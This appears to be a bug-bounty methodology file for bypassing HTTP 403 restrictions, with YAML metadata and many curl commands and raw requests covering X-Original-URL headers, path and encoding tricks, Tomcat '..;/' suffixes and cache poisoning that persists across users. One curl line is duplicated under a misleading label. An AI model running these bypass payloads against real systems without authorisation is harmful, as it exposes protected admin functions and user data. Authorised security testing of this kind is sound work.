---
name: "403-bypass"
version: "2.1"
category: "auth"
subcategory: "bypass"
phase: "exploitation"
tags: ["403", "access-control", "auth", "authentication", "bug-bounty", "bypass", "injection", "path-manipulation", "account-takeover", "api", "authorization", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["curl", "ffuf", "burp-suite", "adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["admin-panel-bypass", "waf-bypass-headers", "sqli", "xss", "api-fuzzing"]
description: "Bug bounty skill: 403 bypass - exploitation phase, auth category"
---
# 403 Forbidden Bypass

## Summary

Techniques to bypass HTTP 403 Forbidden responses on restricted endpoints, admin panels, and protected resources. These techniques exploit differences in how web servers, reverse proxies, and WAFs parse and normalize URLs.

## Methodology

1. Identify endpoints returning 403 Forbidden.
2. Cycle through bypass techniques in order (header-based → path manipulation → encoding).
3. If one technique works on one endpoint, test it across all restricted endpoints.
4. Combine techniques — e.g., `X-Original-URL` with path encoding.

## Detection Commands

```bash
# Baseline — confirm 403
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin

# X-Original-URL header
curl -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /admin" https://target.com/anything

# X-Original-URL + cache poisoning
curl -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /admin" https://target.com/anything

# %2e after first slash
curl -s -o /dev/null -w "%{http_code}" https://target.com/%2e/admin

# Trailing dot
curl -s -o /dev/null -w "%{http_code}" https://target.com/secret/.

# Double slashes
curl -s -o /dev/null -w "%{http_code}" https://target.com//secret//

# Path traversal
curl -s -o /dev/null -w "%{http_code}" https://target.com/./secret/..

# Semicolon injection
curl -s -o /dev/null -w "%{http_code}" https://target.com/;/secret
curl -s -o /dev/null -w "%{http_code}" https://target.com/.;/secret
curl -s -o /dev/null -w "%{http_code}" https://target.com//;//secret

# ..;/ suffix
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin..;/

# Uppercase variation
curl -s -o /dev/null -w "%{http_code}" https://target.com/aDmIN

# URL-encoded path segment
curl -s -o /dev/null -w "%{http_code}" https://target.com/%61dmin

# Encoded slash
curl -s -o /dev/null -w "%{http_code}" https://target.com/api%2fadmin

# Authorization normalization variants (with auth token)
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer TOKEN" https://target.com/api/Admin
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer TOKEN" https://target.com/api//admin
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer TOKEN" https://target.com/api/../admin
```

## Bypass Techniques

### Header-Based

**X-Original-URL / X-Rewrite-URL**

Some applications or reverse proxies (e.g., Spring Boot, certain IIS configurations) use these headers to determine the actual URL internally while the request-line URL is used for access control checks.

```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

If the proxy checks access on `/anything` (which is public) but the backend reads `/admin` from `X-Original-URL`, the 403 is bypassed.

Also test:
- `X-Rewrite-URL: /admin`
- `X-Original-URL: /admin` combined with cache poisoning headers

### Path Manipulation

**%2e After First Slash**

```
http://target.com/%2e/admin
```

The `%2e` (URL-encoded `.`) may confuse the access control check while the web server normalizes it to `/admin`.

**Trailing Dot**

```
http://target.com/secret/.
```

Some servers strip trailing dots, normalizing the path to `/secret/`.

**Double Slashes**

```
http://target.com//secret//
```

Double slashes may bypass path-based rules that match exact patterns.

**Path Traversal in Path**

```
http://target.com/./secret/..
```

The `./` and `..` may be normalized by the web server but not matched by the WAF rule.

**Semicolon Injection**

```
http://target.com/;/secret
http://target.com/.;/secret
http://target.com//;//secret
```

In some servlet containers (Tomcat, Jetty), the semicolon and anything after it is treated as a path parameter and stripped, while WAF rules may still see the full path.

**..;/ Suffix**

```
http://target.com/admin..;/
```

The `..;/` suffix is a common Tomcat/Jetty bypass that strips the suffix and resolves to `/admin`.

### Case Manipulation

**Uppercase / Mixed Case**

```
http://target.com/aDmIN
http://target.com/AdMiN
```

Some access control rules are case-sensitive while the underlying filesystem or routing is case-insensitive (Windows, some Node.js apps).

### URL-Encoded Path Segments

Encode individual characters in the path so the WAF/access-control matcher sees one string while the backend decodes it to the real route:

```
# Encode 'a' in admin
http://target.com/%61dmin            → decodes to /admin
http://target.com/%41Dmin            → decodes to /Admin

# Encode the slash
http://target.com/api%2fadmin
http://target.com/api/%2fadmin

# Double-encoded
http://target.com/%2561dmin
```

### Path Normalization for Authorization

Backend frameworks sometimes normalize paths that access-control rules match literally. Test the variants against endpoints that return 403 AND against endpoints behind role checks (authorization normalization, not just WAF 403s):

```
/api/admin   vs   /api/Admin   vs   /API/ADMIN
/api/admin   vs   /api/../admin
/api/admin   vs   /api//admin
/api/admin   vs   /api/admin/.
/api/admin   vs   /api/%2e/admin
```

If `/api/ADMIN/users` returns data with a regular-user token while `/api/admin/users` returns 403, the route guard is case-sensitive — privileged endpoints are exposed.

### Web Cache Poisoning

Combine `X-Original-URL` with cache poisoning to make the bypass persistent:

```
GET /anything HTTP/1.1
Host: victim.com
X-Original-URL: /admin
```

If the cache stores the response for `/anything` with the admin page content, all users requesting `/anything` see the admin page until the cache expires.

## Tools

- **Burp Suite Repeater** — Manual testing of header/path variants
- **Burp Intruder** — Fuzzing bypass techniques across endpoints
- **ffuf** — Brute-force bypass patterns

## Not a Finding If

- The endpoint returns 403 for all bypass attempts across all techniques
- The 403 is enforced by the application logic (not WAF/proxy) and checks authorization server-side after URL normalization
- `X-Original-URL` is ignored by the backend — confirm by testing both with and without the header

## Notes

- Always baseline the 403 response first to ensure you're measuring bypass, not a different endpoint behavior
- These techniques often work on WAF/proxy-level restrictions but fail on application-level authorization checks
- Cache poisoning via `X-Original-URL` can turn a 403 bypass into a widespread issue affecting all users
- Combine multiple techniques — e.g., `/%2e/admin` with `X-Original-URL` on different paths
- Many of these techniques are framework-specific: `..;/` works on Tomcat/Jetty, `X-Original-URL` on Spring Boot/IIS, case variations on Windows/Node.js
